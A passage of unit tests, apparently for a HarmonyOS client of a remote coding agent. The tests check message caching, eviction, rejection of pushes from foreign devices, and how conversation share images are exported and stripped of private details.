      expect(work.isStreaming).assertEqual(true);
      const tools = work.children[0] as RenderToolGroupItem;
      expect(tools.tools[0].toolUseId).assertEqual('post-progress-tool');

      const done: Record<string, Object> = {};
      done['type'] = 'done';
      store.handleMakerEvent('interleaved-live', done);
      expect(store.getSessionRunStartedAt('interleaved-live')).assertEqual(0);
      const completed = buildRenderItems(
        store.getMessagesWithStreaming('interleaved-live'),
        store.isSessionStreaming('interleaved-live'),
      );
      const completedWork = completed[completed.length - 1] as RenderWorkGroupItem;
      expect(completedWork.isStreaming).assertEqual(false);
    });

    it('evictsLeastRecentlyUsedInactiveMessageSessions', 0, async () => {
      const store = new MessageStore();
      for (let i = 0; i <= MAX_CACHED_MESSAGE_SESSIONS; i++) {
        const data: Record<string, Object> = {};
        data['index'] = i;
        const sessionId = `cached-session-${i}`;
        store.appendLocalSystemCard(sessionId, 'learn', data);
        await store.closeSession(sessionId);
      }
      expect(store.getMessages('cached-session-0').length).assertEqual(0);
      expect(store.getMessages(`cached-session-${MAX_CACHED_MESSAGE_SESSIONS}`).length).assertEqual(1);
    });

    it('roundTripsStructuredRecentMessageCacheAndStripsHeavyMediaBytes', 0, () => {
      const messages: RemoteMessage[] = [];
      for (let i = 0; i < MAX_CACHED_SESSION_MESSAGES + 2; i++) {
        const message = new RemoteMessage();
        message.id = `message-${i}`;
        message.clientId = message.id;
        message.sessionId = 'cache-session';
        message.role = 'user';
        message.createdAt = new Date(1_700_000_000_000 + i).toISOString();
        const image: Record<string, Object> = {};
        image['url'] = 'https://example.invalid/image.png';
        image['base64'] = 'very-heavy-binary';
        const content: Record<string, Object> = {};
        content['text'] = `正文 ${i}`;
        content['images'] = [image];
        message.content = content;
        messages.push(message);
      }
      const normalized = normalizeSessionCacheMessages(messages);
      expect(normalized.length).assertEqual(MAX_CACHED_SESSION_MESSAGES);
      expect(normalized[0].id).assertEqual('message-2');
      const normalizedContent = normalized[0].content as Record<string, Object>;
      const images = normalizedContent['images'] as Object[];
      const cachedImage = images[0] as Record<string, Object>;
      expect(cachedImage['url']).assertEqual('https://example.invalid/image.png');
      expect(cachedImage['base64'] === undefined).assertEqual(true);

      const entry = new CachedSessionMessages();
      entry.deviceId = 'device-1';
      entry.sessionId = 'cache-session';
      entry.updatedAt = 123;
      entry.messages = normalized;
      const serialized = serializeSessionMessageSnapshot('account-a', [entry]) ?? '';
      expect(parseSessionMessageSnapshot(serialized, 'account-b').length).assertEqual(0);
      const restored = parseSessionMessageSnapshot(serialized, 'account-a');
      expect(restored.length).assertEqual(1);
      expect(restored[0].messages.length).assertEqual(MAX_CACHED_SESSION_MESSAGES);
      expect(restored[0].messages[0].id).assertEqual('message-2');
    });

    it('keepsLiveCacheOnAuthoritativeEmptyAndCancelsDeferredClearForNewPush', 0, () => {
      expect(shouldPreserveCachedMessagesForAuthoritativeEmpty(0, true)).assertEqual(true);
      expect(shouldPreserveCachedMessagesForAuthoritativeEmpty(1, true)).assertEqual(false);
      expect(shouldDeferAuthoritativeEmptyWindow(0, true, 4, 4)).assertEqual(true);
      // messages:list 请求期间已有新权威 push：旧空响应不能重新挂起清窗。
      expect(shouldDeferAuthoritativeEmptyWindow(0, true, 4, 5)).assertEqual(false);

      const deferrals = new AuthoritativeEmptyDeferrals();
      deferrals.update('cache-live', true);
      // 空响应先到、push 后到：push 必须取消已挂起的清窗。
      deferrals.cancel('cache-live');
      expect(deferrals.consume('cache-live')).assertEqual(false);
      deferrals.update('cache-live', true);
      expect(deferrals.consume('cache-live')).assertEqual(true);
      expect(deferrals.consume('cache-live')).assertEqual(false);
    });

    it('clearsStaleCachedRowsAfterLiveTurnButKeepsLocalAndFinalProjection', 0, () => {
      const stale = new RemoteMessage();
      stale.id = 'stale-server-row';
      stale.role = 'assistant';
      stale.createdAt = '2026-08-01T00:00:01.000Z';
      const local = new RemoteMessage();
      local.id = 'custom-local-card';
      local.role = 'system';
      local.localOnly = true;
      local.createdAt = '2026-08-01T00:00:02.000Z';
      const finalProjection = new RemoteMessage();
      finalProjection.id = 'final-projection';
      finalProjection.role = 'assistant';
      finalProjection.content = '刚完成但尚未收到 DB push 的回答';
      finalProjection.createdAt = '2026-08-01T00:00:03.000Z';
      finalProjection.isStreaming = false;
      const protectedKeys = new Set<string>();
      protectedKeys.add('id:final-projection');
      const reconciled = reconcileDeferredAuthoritativeEmptyMessages(
        [stale, local, finalProjection], protectedKeys);
      expect(reconciled.length).assertEqual(2);
      expect(reconciled[0].id).assertEqual(local.id);
      expect(reconciled[1].id).assertEqual(finalProjection.id);
      expect(reconciled[1].isStreaming).assertEqual(false);
    });

    it('classifiesRetentionOnlyByAuthoritativeSourceField', 0, () => {
      // 只认权威 source；标题前缀不得用于猜测 scheduler（对齐 Mobile sessionRetention.ts）。
      const scheduler = new RemoteSession();
      scheduler.id = 's-auto';
      scheduler.source = 'scheduler';
      expect(classifySessionRetention(scheduler)).assertEqual('schedule');

      const titleOnly = new RemoteSession();
      titleOnly.id = 's-title';
      titleOnly.title = '[Schedule] 每日巡检';
      expect(classifySessionRetention(titleOnly)).assertEqual('regular');

      const manual = new RemoteSession();
      manual.id = 's-manual';
      manual.source = 'user';
      expect(classifySessionRetention(manual)).assertEqual('regular');

      // 快照缺失时保守按普通任务：宁可多驻留，也不能误回收用户任务。
      expect(classifySessionRetention(undefined)).assertEqual('regular');
    });

    it('protectsLocalWorkRowsFromMemoryEviction', 0, () => {
      const persisted = new RemoteMessage();
      persisted.id = 'db-row-1';
      expect(isProtectedMessageRow(persisted)).assertEqual(false);

      // 乐观用户消息（尚无服务端 id）、本地系统卡、流式行都不可重取。
      const optimistic = new RemoteMessage();
      optimistic.clientId = 'local-1';
      expect(isProtectedMessageRow(optimistic)).assertEqual(true);

      const systemCard = new RemoteMessage();
      systemCard.id = 'harmony-system-goal-1';
      expect(isProtectedMessageRow(systemCard)).assertEqual(true);

      const streaming = new RemoteMessage();
      streaming.id = 'streaming-assistant-1';
      expect(isProtectedMessageRow(streaming)).assertEqual(true);

      const localOnly = new RemoteMessage();
      localOnly.id = 'db-row-2';
      localOnly.localOnly = true;
      expect(isProtectedMessageRow(localOnly)).assertEqual(true);

      expect(hasProtectedMessageRow([persisted])).assertEqual(false);
      expect(hasProtectedMessageRow([persisted, optimistic])).assertEqual(true);
    });

    it('evictsRegularSessionsByLruOnlyWhenOverGlobalBudget', 0, () => {
      // 预算内不淘汰任何会话。
      const small = budgetCandidate('s-small', 100, 1000, 1, false, false);
      expect(selectRegularBudgetEvictions([small]).length).assertEqual(0);

      // 超行数预算：按 accessOrder 从最旧开始淘汰，直到回到预算内。
      const oldest = budgetCandidate('s-old', 500, 1000, 1, false, false);
      const newer = budgetCandidate('s-new', 500, 1000, 2, false, false);
      const victims = selectRegularBudgetEvictions([newer, oldest]);
      expect(victims.length).assertEqual(1);
      expect(victims[0]).assertEqual('s-old');

      // 订阅中（持有工作租约）和含本地保护行的会话整窗跳过，即使最旧。
      const leased = budgetCandidate('s-leased', 500, 1000, 0, true, false);
      const guarded = budgetCandidate('s-guarded', 500, 1000, 0, false, true);
      const evictable = budgetCandidate('s-evictable', 500, 1000, 9, false, false);
      const protectedVictims = selectRegularBudgetEvictions([leased, guarded, evictable]);
      expect(protectedVictims.length).assertEqual(1);
      expect(protectedVictims[0]).assertEqual('s-evictable');

      // 自动化任务不参与普通任务全局预算。
      const automation = budgetCandidate('s-auto', 5000, 1000, 0, false, false);
      automation.retention = 'schedule';
      expect(selectRegularBudgetEvictions([automation, small]).length).assertEqual(0);

      // 字节预算独立生效：行数很少但体积超限时同样淘汰。
      const heavy = budgetCandidate('s-heavy', 10, REGULAR_GLOBAL_MESSAGE_BYTES_BUDGET, 1, false, false);
      const light = budgetCandidate('s-light', 10, 4096, 2, false, false);
      const byteVictims = selectRegularBudgetEvictions([heavy, light]);
      expect(byteVictims.length).assertEqual(1);
      expect(byteVictims[0]).assertEqual('s-heavy');
    });

    it('keepsProtectedRowsWhenTrimmingTheTailWindowAndPreservesOrder', 0, () => {
      const rows: RemoteMessage[] = [];
      for (let i = 0; i < 5; i++) {
        const row = new RemoteMessage();
        row.id = `db-${i}`;
        rows.push(row);
      }
      // 中间插一条乐观消息：裁剪后必须保留，且相对顺序不变。
      const optimistic = new RemoteMessage();
      optimistic.clientId = 'pending-send';
      rows.splice(2, 0, optimistic);

      const trimmed = trimMessageWindow(rows, 3);
      expect(trimmed.length).assertEqual(3);
      // 保护行保留 + 最新的两条服务端行。
      expect(trimmed[0].clientId).assertEqual('pending-send');
      expect(trimmed[1].id).assertEqual('db-3');
      expect(trimmed[2].id).assertEqual('db-4');

      // 未超限时原样返回副本。
      expect(trimMessageWindow(rows, 99).length).assertEqual(rows.length);

      // 保护行多于上限时允许略超：数据安全优先于精确条数。
      const allProtected: RemoteMessage[] = [];
      for (let i = 0; i < 4; i++) {
        const row = new RemoteMessage();
        row.id = `streaming-${i}`;
        allProtected.push(row);
      }
      expect(trimMessageWindow(allProtected, 2).length).assertEqual(4);
    });

    it('rejectsRealtimePushFromAForeignDevice', 0, () => {
      // 未归属会话的首个 push 可接受（push 可能早于历史加载）。
      expect(pushAuthorityAccepted('device-a', '', '')).assertEqual(true);
      // 订阅设备优先：迟到的 B 帧不得写进当前订阅 A 的窗口。
      expect(pushAuthorityAccepted('device-a', 'device-a', 'device-a')).assertEqual(true);
      expect(pushAuthorityAccepted('device-b', 'device-a', 'device-a')).assertEqual(false);
      // 无订阅但有缓存归属：后台会话仍接收自己设备的更新，拒绝其它设备。
      expect(pushAuthorityAccepted('device-a', '', 'device-a')).assertEqual(true);
      expect(pushAuthorityAccepted('device-b', '', 'device-a')).assertEqual(false);
      // 无法归因的帧一律丢弃。
      expect(pushAuthorityAccepted('', 'device-a', 'device-a')).assertEqual(false);
    });

    it('dropsForeignDevicePushInsteadOfWritingTheCurrentWindow', 0, () => {
      const store = new MessageStore();
      const own: Record<string, Object> = {};
      own['id'] = 'row-a';
      own['clientId'] = 'row-a';
      own['role'] = 'assistant';
      own['content'] = 'A 设备的内容';
      const ownPush: Record<string, Object> = {};
      ownPush['sessionId'] = 'fence-session';
      ownPush['message'] = own;
      store.handleSessionPush('device-a', 'local-db:messages:created', ownPush);
      expect(store.getMessages('fence-session').length).assertEqual(1);

      // 另一台设备的帧携带同一 sessionId：必须被丢弃，不得进入窗口。
      const foreign: Record<string, Object> = {};
      foreign['id'] = 'row-b';
      foreign['clientId'] = 'row-b';
      foreign['role'] = 'assistant';
      foreign['content'] = 'B 设备的内容';
      const foreignPush: Record<string, Object> = {};
      foreignPush['sessionId'] = 'fence-session';
      foreignPush['message'] = foreign;
      store.handleSessionPush('device-b', 'local-db:messages:created', foreignPush);

      const rows = store.getMessages('fence-session');
      expect(rows.length).assertEqual(1);
      expect(rows[0].id).assertEqual('row-a');
    });

    it('compactsTheTailWindowOnLeaveWithoutDroppingLocalWork', 0, async () => {
      const store = new MessageStore();
      const sessionId = 'compact-session';
      // 120 条已落库行 + 1 条乐观消息：离开后压回 80 行尾窗，乐观消息必须保留。
      for (let i = 0; i < 120; i++) {
        const row: Record<string, Object> = {};
        row['id'] = `db-${i}`;
        row['clientId'] = `db-${i}`;
        row['role'] = 'assistant';
        row['content'] = `第 ${i} 条`;
        row['createdAt'] = `2026-08-20T10:${(i % 60).toString().padStart(2, '0')}:00.000Z`;
        const push: Record<string, Object> = {};
        push['sessionId'] = sessionId;
        push['message'] = row;
        store.handleSessionPush('device-a', 'local-db:messages:created', push);
      }
      expect(store.getMessages(sessionId).length).assertEqual(120);

      await store.closeSession(sessionId);
      const kept = store.getMessages(sessionId);
      // 压回默认尾窗，不再保留全部已上翻历史。
      expect(kept.length).assertEqual(80);
      // 保留的是最新的一段，且仍可从权威历史继续回填。
      expect(kept[kept.length - 1].id).assertEqual('db-119');
      expect(store.hasMore(sessionId)).assertEqual(true);
    });

    it('degradesSecurityObservabilitySafelyAndNeverBlocksAuth', 0, () => {
      const adapter = new SecurityObservabilityAdapter();
      // 缺 SDK：所有调用都是安全 no-op，不抛异常、不阻断登录与退出。
      expect(adapter.isActive()).assertEqual(false);
      adapter.bindUser('user-1');
      adapter.clearUser();
      expect(adapter.isActive()).assertEqual(false);

      const sink = new RecordingObservabilitySink();
      const bound = sink.bound;

      // SDK 存在但当前区域不启用：仍然不上报。
      adapter.configure(sink, false);
      expect(adapter.isActive()).assertEqual(false);
      adapter.bindUser('user-1');
      expect(bound.length).assertEqual(0);

      // 启用后正常绑定；两端空白会被裁掉。
      adapter.configure(sink, true);
      expect(adapter.isActive()).assertEqual(true);
      adapter.bindUser('  user-1  ');
      expect(bound.length).assertEqual(1);
      expect(bound[0]).assertEqual('user-1');

      // 空 userId 等价于清空，避免把空串当合法身份写进去。
      adapter.bindUser('   ');
      expect(sink.cleared).assertEqual(1);
      expect(bound.length).assertEqual(1);

      // 登出清空。
      adapter.clearUser();
      expect(sink.cleared).assertEqual(2);

      // sink 抛异常时必须吞掉：观测失败不能影响认证流程。
      adapter.configure(new ThrowingObservabilitySink(), true);
      adapter.bindUser('user-2');
      adapter.clearUser();
      expect(adapter.isActive()).assertEqual(true);
    });

    it('splitsShareSegmentsIdenticallyForPreviewAndExport', 0, () => {
      // 单段：全部内容一张图。
      expect(shareSegmentStartIndices(5, 1).length).assertEqual(1);
      expect(shareSegmentStartIndices(5, 1)[0]).assertEqual(0);

      // 均分：10 项分 2 段 → [0, 5]。
      const two = shareSegmentStartIndices(10, 2);
      expect(two.length).assertEqual(2);
      expect(two[0]).assertEqual(0);
      expect(two[1]).assertEqual(5);

      // 不能整除时向上取整，最后一段更短，且不产生空段。
      const three = shareSegmentStartIndices(7, 3);
      expect(three.length).assertEqual(3);
      expect(three[0]).assertEqual(0);
      expect(three[1]).assertEqual(3);
      expect(three[2]).assertEqual(6);

      // 段数大于项数时不产生超出项数的起点（否则预览会多出空白图）。
      const sparse = shareSegmentStartIndices(2, 5);
      expect(sparse.length).assertEqual(2);
      expect(sparse[1]).assertEqual(1);

      // 边界输入安全返回空。
      expect(shareSegmentStartIndices(0, 3).length).assertEqual(0);
      expect(shareSegmentStartIndices(5, 0).length).assertEqual(0);
    });

    it('packsMeasuredShareItemsWithoutClippingLongCards', 0, () => {
      // 每段 100px，垂直 padding 10px、项间距 5px：前两项刚好同段，第三项另起。
      const starts = shareSegmentStartIndicesByHeight([30, 40, 45], 100, 10, 5);
      expect(starts.length).assertEqual(2);
      expect(starts[0]).assertEqual(0);
      expect(starts[1]).assertEqual(2);

      // 单卡连同上下 padding 已超过上限时必须显式失败，不能让 builder 静默裁正文。
      expect(shareSegmentStartIndicesByHeight([81], 100, 10, 5).length).assertEqual(0);
      // 尾部“仅包含当前展开内容”提示也必须计入最后一段预算。
      expect(shareSegmentStartIndicesByHeight([70], 100, 10, 5, 11).length).assertEqual(0);
      expect(shareSegmentStartIndicesByHeight([0], 100, 10, 5).length).assertEqual(0);
    });

    it('releasesShareResourcesOnEveryExitPathIdempotently', 0, () => {
      const flow = new ShareFlowState();
      expect(flow.currentStage()).assertEqual(SHARE_STAGE_IDLE);
      expect(shareFlowBusy(SHARE_STAGE_IDLE)).assertEqual(false);

      const generation = flow.begin();
      expect(flow.currentStage()).assertEqual(SHARE_STAGE_RENDERING);
      expect(shareFlowBusy(flow.currentStage())).assertEqual(true);
      flow.resources().noteBitmap('bitmap-1');
      flow.resources().noteFile('/cache/a.png');
      flow.resources().notePanelSubscribed(true);
      // 同一句柄重复登记不产生重复释放。
      flow.resources().noteBitmap('bitmap-1');
      expect(flow.resources().pendingBitmaps().length).assertEqual(1);

      expect(flow.settlePreview(generation)).assertEqual(true);
      expect(flow.currentStage()).assertEqual(SHARE_STAGE_PREVIEW);

      // 取消：交出全部资源，并推进代次让在途结果作废。
      const release = flow.finish();
      expect(release.bitmaps.length).assertEqual(1);
      expect(release.files[0]).assertEqual('/cache/a.png');
      expect(release.unsubscribePanel).assertEqual(true);
      expect(flow.currentStage()).assertEqual(SHARE_STAGE_IDLE);
      expect(flow.isCurrent(generation)).assertEqual(false);

      // 幂等：重复结束不再返回资源，也不会二次释放。
      expect(flow.finish().isEmpty()).assertEqual(true);
      expect(flow.resources().isEmpty()).assertEqual(true);

      // 过期代次的异步结果不得推进状态。
      expect(flow.settlePreview(generation)).assertEqual(false);
      expect(flow.settleSharing(generation)).assertEqual(false);
      expect(flow.fail(generation, 'stale').isEmpty()).assertEqual(true);
    });

    it('keepsShareErrorForRetryAndGuardsStageOrder', 0, () => {
      const flow = new ShareFlowState();
      const generation = flow.begin();
      flow.resources().noteFile('/cache/partial.png');

      // 失败：释放资源但保留错误信息供重试入口显示。
      const release = flow.fail(generation, '截图尺寸超出设备上限');
      expect(release.files.length).assertEqual(1);
      expect(flow.currentStage()).assertEqual(SHARE_STAGE_FAILED);
      expect(flow.error()).assertEqual('截图尺寸超出设备上限');
      expect(shareFlowBusy(SHARE_STAGE_FAILED)).assertEqual(false);

      // 重试是新一轮：代次推进、错误清空。
      const retry = flow.begin();
      expect(retry === generation).assertEqual(false);
      expect(flow.error()).assertEqual('');

      // 未经预览不得直接进入分享阶段。
      expect(flow.settleSharing(retry)).assertEqual(false);
      expect(flow.settlePreview(retry)).assertEqual(true);
      expect(flow.settleSharing(retry)).assertEqual(true);
      expect(flow.currentStage()).assertEqual(SHARE_STAGE_SHARING);
      expect(shareFlowBusy(flow.currentStage())).assertEqual(true);
    });

    it('freezesShareProjectionToWhatTheUserCanActuallySee', 0, () => {
      const user = new RenderMessageItem();
      user.type = 'message';
      user.key = 'm-user';
      user.kind = 'user';
      user.body = '第一行\n第二行\n第三行\n第四行';

      const answer = new RenderMessageItem();
      answer.type = 'message';
      answer.key = 'm-answer';
      answer.kind = 'assistant';
      answer.body = '这是回复正文';

      // 合成输入不进导出。
      const hidden = new RenderMessageItem();
      hidden.type = 'message';
      hidden.key = 'm-hidden';
      hidden.kind = 'user';
      hidden.body = '合成触发';
      hidden.hidden = true;

      // 错误消息含内部详情，不导出。
      const errorRow = new RenderMessageItem();
      errorRow.type = 'message';
      errorRow.key = 'm-error';
      errorRow.kind = 'error';
      errorRow.body = '/Users/someone/secret/path 失败';

      const collapsedWork = new RenderWorkGroupItem();
      collapsedWork.type = 'work_group';
      collapsedWork.key = 'w-collapsed';

      const expandedWork = new RenderWorkGroupItem();
      expandedWork.type = 'work_group';
      expandedWork.key = 'w-expanded';
      const workChild = new RenderMessageItem();
      workChild.type = 'message';
      workChild.kind = 'assistant';
      workChild.body = '已读取配置文件';
      expandedWork.children = [workChild];

      const nestedWork = new RenderWorkGroupItem();
      nestedWork.type = 'work_group';
      nestedWork.key = 'w-nested';
      const nestedUser = new RenderMessageItem();
      nestedUser.type = 'message';
      nestedUser.key = 'nested-user';
      nestedUser.kind = 'user';
      nestedUser.body = '嵌套第一行\n嵌套第二行\n隐藏正文';
      nestedWork.children = [nestedUser];
      expandedWork.children.push(nestedWork);

      const expanded = new Set<string>();
      expanded.add('w-expanded');
      const projection = freezeShareProjection(
        [user, answer, hidden, errorRow, collapsedWork, expandedWork], expanded, 2);

      const keys: string[] = [];
      for (let i = 0; i < projection.items.length; i++) keys.push(projection.items[i].key);
      // 只保留可见的用户消息、正文和已展开的工作内容。
      expect(keys.join(',')).assertEqual('m-user,m-answer,w-expanded');
      // 折叠的用户正文按可见行截断，并标记有内容被省略。
      expect(projection.items[0].text).assertEqual('第一行\n第二行');
      expect(projection.omittedCollapsedContent).assertEqual(true);
      expect(projection.items[2].text).assertEqual('已读取配置文件\n嵌套第一行\n嵌套第二行');

      // 已展开工作组的嵌套消息也必须沿用实际屏幕折叠结果，不能因投影递归失败
      // 把隐藏的长用户正文带出分享图。
      const nestedVisible = new Map<string, string>();
      nestedVisible.set('nested-user', '嵌套第一行…');
      const nestedProjection = freezeShareProjection(
        [expandedWork], expanded, 2, nestedVisible);
      expect(nestedProjection.items.length).assertEqual(1);
      expect(nestedProjection.items[0].text).assertEqual('已读取配置文件\n嵌套第一行…');
      expect(nestedProjection.omittedCollapsedContent).assertEqual(true);

      const subagent = new RenderSubagentGroupItem();
      subagent.type = 'subagent_group';
      subagent.key = 'subagent-expanded';
      subagent.summary = '子任务已完成';
      subagent.children = [workChild];
      expanded.add(subagent.key);
      const subagentProjection = freezeShareProjection([subagent], expanded, 2);
      expect(subagentProjection.items.length).assertEqual(1);
      // summary 是界面上的子任务状态，不是用户可见消息正文，不应被导出。
      expect(subagentProjection.items[0].text).assertEqual('已读取配置文件');

      // 未折叠、未展开任何内容时不误报省略。
      const clean = freezeShareProjection([answer], new Set<string>(), 10);
      expect(clean.items.length).assertEqual(1);
      expect(clean.omittedCollapsedContent).assertEqual(false);

      // 页面传入的视觉行/粘贴 chip 可见投影优先，隐藏正文不得进入分享图。
      const visibleOverrides = new Map<string, string>();
      visibleOverrides.set('m-user', '第一行…');
      const overridden = freezeShareProjection(
        [user], new Set<string>(), 10, visibleOverrides);
      expect(overridden.items[0].text).assertEqual('第一行…');
      expect(overridden.omittedCollapsedContent).assertEqual(true);

      const emptySystem = new RenderMessageItem();
      emptySystem.type = 'message';
      emptySystem.key = 'empty-system';
      emptySystem.kind = 'system';
      emptySystem.body = '   ';
      expect(freezeShareProjection([emptySystem], new Set<string>(), 10).items.length)
        .assertEqual(0);

      // 交互类与队列类渲染项一律不可分享。
      expect(isShareableRenderType('permission')).assertEqual(false);
      expect(isShareableRenderType('todo')).assertEqual(false);
      expect(isShareableRenderType('message')).assertEqual(true);
      expect(isShareableRenderType('subagent_group')).assertEqual(true);
      expect(isShareableMessageKind('error')).assertEqual(false);
      expect(isShareableMessageKind('system')).assertEqual(false);
    });

    it('plansShareSegmentsWithoutAnUnboundedCanvas', 0, () => {
      const usable = SHARE_MAX_IMAGE_EDGE_PX - SHARE_IMAGE_SAFETY_MARGIN_PX;
      // 短会话一张图。
      const short = planShareSegments(1200, 1080);
      expect(short.segments).assertEqual(1);
      expect(short.requiresNarrowing).assertEqual(false);

      // 刚好一段与略超一段的边界。
      expect(planShareSegments(usable, 1080).segments).assertEqual(1);
      expect(planShareSegments(usable + 1, 1080).segments).assertEqual(2);

      // 超长会话分多图，但不得超过上限张数。
      const long = planShareSegments(usable * SHARE_MAX_SEGMENTS, 1080);
      expect(long.segments).assertEqual(SHARE_MAX_SEGMENTS);
      expect(long.requiresNarrowing).assertEqual(false);

      // 再长就必须提示用户缩小范围，绝不生成无上限画布。
      const tooLong = planShareSegments(usable * SHARE_MAX_SEGMENTS + 1, 1080);
      expect(tooLong.requiresNarrowing).assertEqual(true);
      expect(tooLong.segments).assertEqual(0);

      // 宽度本身超出纹理上限时无法靠分段解决。
      const tooWide = planShareSegments(1000, SHARE_MAX_IMAGE_EDGE_PX + 1);
      expect(tooWide.requiresNarrowing).assertEqual(true);
      expect(tooWide.segments).assertEqual(0);

      // 空内容不导出。
      expect(planShareSegments(0, 1080).segments).assertEqual(0);

      // API 26 返回的设备上限低于保守常量时，以真实设备限制规划。
      const deviceLimited = planShareSegments(1800, 600, 2048, 1024);
      expect(deviceLimited.segments).assertEqual(3);
      expect(deviceLimited.segmentHeightPx).assertEqual(1024 - SHARE_IMAGE_SAFETY_MARGIN_PX);
      expect(deviceLimited.snapshotHeightLimitPx).assertEqual(1024);
    });

    it('keepsSharedFileNamesFreeOfTitlesAndPaths', 0, () => {
      const name = shareImageFileName(2, 1787220000000);
      expect(name).assertEqual('cindy-conversation-1787220000000-2.png');
      // 非法序号 / 时间戳安全兜底，且不含任何标题、目录或用户标识。
      expect(shareImageFileName(0, 0)).assertEqual('cindy-conversation-0-1.png');
      expect(name.indexOf('/')).assertEqual(-1);
      expect(name.indexOf('Users')).assertEqual(-1);
    });

    it('growsModelMetaWidthWithSystemFontScaleWithinCap', 0, () => {
      // 默认（未放大）保持既有布局上限。
      setSystemFontSizeScale(1);
      expect(uiScaledMaxWidth(176, 264)).assertEqual(176);
      expect(getSystemFontSizeScale()).assertEqual(1);

      // 放大字号时容器跟着长，避免模型名 / 强度被截成省略号。
      setSystemFontSizeScale(1.3);
      expect(uiScaledMaxWidth(176, 264)).assertEqual(229);

      // 超大字号被 cap 兜住，不挤占同排其它控件。
      setSystemFontSizeScale(3.2);
      expect(uiScaledMaxWidth(176, 264)).assertEqual(264);

      // 缩小字号不得让容器比基准更窄。
      setSystemFontSizeScale(0.7);
      expect(uiScaledMaxWidth(176, 264)).assertEqual(176);

      // 非法值安全退回 1，不改变布局。
      setSystemFontSizeScale(0);
      expect(getSystemFontSizeScale()).assertEqual(1);
      setSystemFontSizeScale(undefined);
      expect(getSystemFontSizeScale()).assertEqual(1);
      expect(uiScaledMaxWidth(176, 264)).assertEqual(176);
    });

    it('derivesOptimisticTitlesForAttachmentOnlyFirstMessages', 0, () => {
      // 有文字时用原文归一化，附件不参与。
      expect(deriveOptimisticSessionTitle('修一下登录问题', ['a.png'], true))
        .assertEqual('修一下登录问题');
      // 文字仅含空白视为无文字，退到附件展示名。
      expect(deriveOptimisticSessionTitle('   \n  ', ['report.pdf'], false))
        .assertEqual('report.pdf');

      // 纯图片：使用第一张图片的展示名。
      expect(deriveOptimisticSessionTitle('', ['screenshot.png'], true))
        .assertEqual('screenshot.png');
      // 纯文件：使用安全展示名，必须去掉任何路径前缀，不泄漏目录结构。
      expect(deriveOptimisticSessionTitle('', ['/Users/someone/secret/报表.xlsx'], false))
        .assertEqual('报表.xlsx');
      expect(deriveOptimisticSessionTitle('', ['C:\\Users\\me\\notes.txt'], false))
        .assertEqual('notes.txt');
      expect(attachmentDisplayName('/a/b/c.png')).assertEqual('c.png');

      // 附件没有可用文件名时退到本地化类别词。
      expect(deriveOptimisticSessionTitle('', [], true)).assertEqual('图片消息');
      expect(deriveOptimisticSessionTitle('', ['   '], false)).assertEqual('文件消息');

      // 完全没有素材时返回空串，由 taskDisplayTitle 落到「未命名任务」。
      expect(deriveOptimisticSessionTitle('', [], false)).assertEqual('');
      const untitled = new RemoteSession();
      untitled.title = '';
      expect(taskDisplayTitle(untitled)).assertEqual('未命名任务');

      // 超长文字按 40 字截断，与被控端自动起名逐字一致。
      const long = 'あ'.repeat(60);
      expect(deriveOptimisticSessionTitle(long, [], false).length).assertEqual(40);
    });

    it('takesOverTailOnAcceptedSendButNotOnPlainPush', 0, () => {
      // 用户主动发送被接受：即使正在阅读历史也必须接管尾部回到底部。
      expect(shouldTakeOverTail(true, false)).assertEqual(true);
      expect(shouldTakeOverTail(true, true)).assertEqual(true);
      // 收到新 push 不得无条件抢回阅读位置：只有本就贴底才继续跟随。
      expect(shouldTakeOverTail(false, true)).assertEqual(true);
      expect(shouldTakeOverTail(false, false)).assertEqual(false);
    });

    it('formatsTheComposerActivityClockLikeIos', 0, () => {
      expect(sessionActivityElapsedMs(10_999, 10_000)).assertEqual(999);
      expect(sessionActivityElapsedMs(9_000, 10_000)).assertEqual(0);
      expect(formatSessionActivityElapsed(999)).assertEqual('0s');
      expect(formatSessionActivityElapsed(1_000)).assertEqual('1s');
      expect(formatSessionActivityElapsed(62_900)).assertEqual('1m 2s');
    });

    it('keepsNewPersistedStreamingBlockWhenOlderPushArrives', 0, () => {
      const store = new MessageStore();
      const firstData: Record<string, Object> = {};
      firstData['text'] = '第一段';
      const firstEvent: Record<string, Object> = {};
      firstEvent['type'] = 'text';
      firstEvent['data'] = firstData;
      store.handleMakerEvent('persist-session', firstEvent, 'persist-1');

      const secondData: Record<string, Object> = {};
      secondData['text'] = '第二段仍在生成';
      const secondEvent: Record<string, Object> = {};
      secondEvent['type'] = 'text';
      secondEvent['data'] = secondData;
      store.handleMakerEvent('persist-session', secondEvent, 'persist-2');

      const oldMessage: Record<string, Object> = {};
      oldMessage['id'] = 'persist-1';
      oldMessage['clientId'] = 'persist-1';
      oldMessage['role'] = 'assistant';
      oldMessage['content'] = '第一段（已落库）';
      const push: Record<string, Object> = {};
      push['sessionId'] = 'persist-session';
      push['message'] = oldMessage;
      store.handleSessionPush('device-1', 'local-db:messages:created', push);

      const rows = store.getMessagesWithStreaming('persist-session');
      expect(rows.some((row: RemoteMessage) => row.id === 'persist-1'
        && row.content === '第一段（已落库）')).assertEqual(true);
      expect(rows.some((row: RemoteMessage) => row.id === 'persist-2'
        && row.content === '第二段仍在生成')).assertEqual(true);
    });

    it('replacesTruncatedRowsWithCompleteCreatedPushes', 0, () => {
      const truncated = new RemoteMessage();
      truncated.id = 'same-row';
      truncated.content = '内容过大，已截断';
      truncated.agentMeta['remoteContentTruncated'] = true;
      const complete = new RemoteMessage();
      complete.id = 'same-row';
      complete.content = '完整正文';
      expect(preferIncomingCreatedMessage(truncated, complete)).assertEqual(true);
      expect(preferIncomingCreatedMessage(complete, truncated)).assertEqual(false);
    });

    it('deduplicatesLiveToolRowsAfterThePersistedCallArrives', 0, () => {
      const store = new MessageStore();
      const input: Record<string, Object> = {};
      input['file_path'] = '/repo/MessageRender.ets';
      const liveData: Record<string, Object> = {};
      liveData['toolUseId'] = 'same-use';
      liveData['toolName'] = 'Read';
      liveData['input'] = input;
      const liveEvent: Record<string, Object> = {};
      liveEvent['type'] = 'tool_use';
      liveEvent['data'] = liveData;
      store.handleMakerEvent('same-session', liveEvent);

      const persistedMessage: Record<string, Object> = {};
      persistedMessage['id'] = 'persisted-tool';
      persistedMessage['clientId'] = 'persisted-tool';
      persistedMessage['role'] = 'tool_use';
      persistedMessage['toolUseId'] = 'same-use';
      const persistedContent: Record<string, Object> = {};
      persistedContent['toolUseId'] = 'same-use';
      persistedContent['toolName'] = 'Read';
      persistedContent['input'] = input;
      persistedMessage['content'] = persistedContent;
      const push: Record<string, Object> = {};
      push['sessionId'] = 'same-session';
      push['message'] = persistedMessage;
      store.handleSessionPush('device-1', 'local-db:messages:created', push);

